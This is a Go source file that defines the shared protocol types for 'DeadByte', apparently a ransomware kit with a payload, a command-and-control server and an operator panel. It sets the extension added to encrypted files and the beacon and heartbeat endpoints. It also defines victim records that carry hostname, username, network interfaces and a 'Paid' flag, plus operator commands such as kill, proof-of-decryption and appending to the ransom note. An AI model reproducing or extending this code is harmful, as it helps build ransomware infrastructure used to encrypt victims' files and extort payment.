// Package types defines the wire protocol shared between the DeadByte
// payload, the C2 server and the panel frontend.
package types

import "time"

const (
	// Ext is appended to every encrypted file.
	Ext = ".deadbyte"
	// Version of the DeadByte protocol / payload.
	Version = "1.1.0"
	// APIVersion of the C2 HTTP API.
	APIVersion = 1

	BeaconPath    = "/api/v1/beacon"
	HeartbeatPath = "/api/v1/heartbeat"
	PanelPath     = "/"

	HeaderToken = "X-DeadByte-Token"
)

// BeaconReq is the initial registration sent by a payload.
type BeaconReq struct {
	ID         string   `json:"id,omitempty"` // empty on first registration
	Hostname   string   `json:"hostname"`
	Username   string   `json:"username"`
	OS         string   `json:"os"`
	Arch       string   `json:"arch"`
	PID        int      `json:"pid"`
	Version    string   `json:"version"`
	Interfaces []string `json:"interfaces,omitempty"`
	Dirs       []string `json:"dirs,omitempty"`
}

// BeaconResp is returned by the C2 on registration.
type BeaconResp struct {
	ID       string `json:"id"`
	Interval int    `json:"interval"` // seconds
}

// HeartbeatReq carries progress/status information.
type HeartbeatReq struct {
	ID     string `json:"id"`
	Phase  string `json:"phase"`
	Files  int64  `json:"files"`
	Bytes  int64  `json:"bytes"`
	Errors int64  `json:"errors"`
	Note   string `json:"note,omitempty"`
}

// HeartbeatResp contains pending commands for the payload.
type HeartbeatResp struct {
	Commands []Command `json:"commands"`
}

// Command is an instruction issued from the panel.
type Command struct {
	ID    string `json:"id"`
	Type  string `json:"type"`
	Value string `json:"value,omitempty"`
	At    int64  `json:"at"`
}

// Infection is the server-side record of one victim.
type Infection struct {
	ID         string   `json:"id"`
	Hostname   string   `json:"hostname"`
	Username   string   `json:"username"`
	OS         string   `json:"os"`
	Arch       string   `json:"arch"`
	PID        int      `json:"pid"`
	Version    string   `json:"version"`
	Interfaces []string `json:"interfaces,omitempty"`
	FirstSeen  int64    `json:"first_seen"`
	LastSeen   int64    `json:"last_seen"`
	Phase      string   `json:"phase"`
	Files      int64    `json:"files"`
	Bytes      int64    `json:"bytes"`
	Errors     int64    `json:"errors"`
	Paid       bool     `json:"paid"`
	Note       string   `json:"note,omitempty"`
}

// Event is an audit/log entry shown in the panel.
type Event struct {
	At    int64  `json:"at"`
	InfID string `json:"inf_id,omitempty"`
	Level string `json:"level"`
	Msg   string `json:"msg"`
}

// CommandTypes understood by the payload.
const (
	CmdKill      = "kill"       // stop encrypting, exit
	CmdBeaconOff = "beacon_off" // stop heartbeats
	CmdProof     = "proof"      // simulate "proof of decryption"
	CmdMessage   = "message"    // append a message to the ransom note
)

func Now() int64 { return time.Now().Unix() }
